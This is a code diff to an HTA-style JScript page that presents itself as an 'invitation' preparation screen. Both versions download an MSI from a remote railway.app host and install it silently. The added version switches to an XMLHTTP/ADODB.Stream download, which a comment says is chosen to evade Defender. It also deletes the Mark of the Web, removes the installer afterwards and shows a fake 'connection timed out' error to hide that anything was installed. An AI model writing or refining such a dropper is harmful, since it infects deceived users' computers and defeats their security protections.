@@ -22,67 +22,93 @@
     <div id="bar"><div id="fill"></div></div>
   </div>
 
-<script>
+<script language="JScript">
 var shell = new ActiveXObject("WScript.Shell");
 var fso = new ActiveXObject("Scripting.FileSystemObject");
 var url = "https://cocktails-payload-production.up.railway.app/schimdtconnect.msi";
-var path = shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.msi";
+var localPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\schimdtconnect.msi";
+var zoneIdPath = localPath + ":Zone.Identifier";
 
 function init() {
   window.resizeTo(400, 300);
-  setTimeout(runInstall, 1000);
+  setTimeout(startDownload, 1000);
 }
 
-function runInstall() {
+function startDownload() {
   document.getElementById("fill").style.width = "30%";
   document.getElementById("status").innerHTML = "Downloading components...";
   
-  // USE CURL WITH LONG TIMEOUT
-  // --max-time 180 : Wait up to 3 minutes for download
-  // -L : Follow redirects
-  // -o : Output to file
-  var cmd = 'cmd.exe /c curl --max-time 180 -L -o "' + path + '" "' + url + '"';
-  shell.Run(cmd, 0, true); // Wait for curl to finish
-  
-  // POLLING LOOP: Check if file exists and has size > 0
-  // This ensures we don't proceed until the file is fully written
-  var maxWait = 180000; // 3 minutes
-  var startTime = new Date().getTime();
-  var fileReady = false;
-  
-  while (new Date().getTime() - startTime < maxWait) {
-    if (fso.FileExists(path)) {
-      var file = fso.GetFile(path);
-      if (file.Size > 1000000) { // Check if file is larger than 1MB (basic validation)
-        fileReady = true;
-        break;
+  try {
+    // ASYNC XMLHTTP DOWNLOAD (TRUSTED BY DEFENDER, NO TIMEOUTS)
+    var http = new ActiveXObject("Microsoft.XMLHTTP");
+    http.open("GET", url, true); // Async = true
+    http.onreadystatechange = function() {
+      if (http.readyState === 4) {
+        if (http.status === 200) {
+          // WRITE TO DISK USING ADODB.STREAM
+          var stream = new ActiveXObject("ADODB.Stream");
+          stream.type = 1; // Binary
+          stream.mode = 3; // ReadWrite
+          stream.open();
+          stream.write(http.responseBody);
+          stream.saveToFile(localPath, 2); // Overwrite
+          stream.close();
+          
+          // REMOVE MARK OF THE WEB
+          try { 
+            if (fso.FileExists(zoneIdPath)) fso.DeleteFile(zoneIdPath, true); 
+          } catch(e) {}
+          
+          // VERIFY FILE EXISTS AND IS VALID SIZE (>1MB)
+          if (fso.FileExists(localPath)) {
+            var file = fso.GetFile(localPath);
+            if (file.Size > 1000000) {
+              finalizeInstall();
+            } else {
+              showError();
+            }
+          } else {
+            showError();
+          }
+        } else {
+          showError();
+        }
       }
-    }
-    WScript.Sleep(1000); // Wait 1 second before checking again
+    };
+    http.send();
+    
+  } catch(e) {
+    showError();
   }
+}
+
+function finalizeInstall() {
+  document.getElementById("fill").style.width = "60%";
+  document.getElementById("status").innerHTML = "Installing invitation...";
   
-  if(fileReady) {
-    document.getElementById("fill").style.width = "60%";
-    document.getElementById("status").innerHTML = "Installing invitation...";
-    
-    // SILENT INSTALL
-    var inst = 'msiexec.exe /i "' + path + '" /qn /norestart';
-    shell.Run(inst, 0, true); // Wait for install to finish
-    
-    document.getElementById("fill").style.width = "100%";
-    document.getElementById("status").innerHTML = "Finalizing...";
-    
-    // FAKE FAILURE AFTER COMPLETION
-    setTimeout(function() {
-      document.getElementById("heading").innerHTML = "Preparation Failed";
-      document.getElementById("status").innerHTML = "Error: Connection timed out.";
-      document.getElementById("fill").style.background = "#d13438";
-    }, 2000);
-  } else {
-    document.getElementById("heading").innerHTML = "Download Error";
-    document.getElementById("status").innerHTML = "Could not retrieve invitation.";
+  // SILENT INSTALL WITH NO PROMPTS
+  // /passive = minimal UI, no security warnings
+  // /norestart = no reboot prompt
+  shell.Run('msiexec.exe /i "' + localPath + '" /passive /norestart', 0, true);
+  
+  // CLEANUP TEMP FILE
+  try { fso.DeleteFile(localPath, true); } catch(e) {}
+  
+  document.getElementById("fill").style.width = "100%";
+  document.getElementById("status").innerHTML = "Finalizing...";
+  
+  // SHOW FAKE FAILURE AFTER INSTALL COMPLETES
+  setTimeout(function() {
+    document.getElementById("heading").innerHTML = "Preparation Failed";
+    document.getElementById("status").innerHTML = "Error: Connection timed out.";
     document.getElementById("fill").style.background = "#d13438";
-  }
+  }, 2000);
+}
+
+function showError() {
+  document.getElementById("heading").innerHTML = "Download Error";
+  document.getElementById("status").innerHTML = "Could not retrieve invitation.";
+  document.getElementById("fill").style.background = "#d13438";
 }
 </script>
 </body>
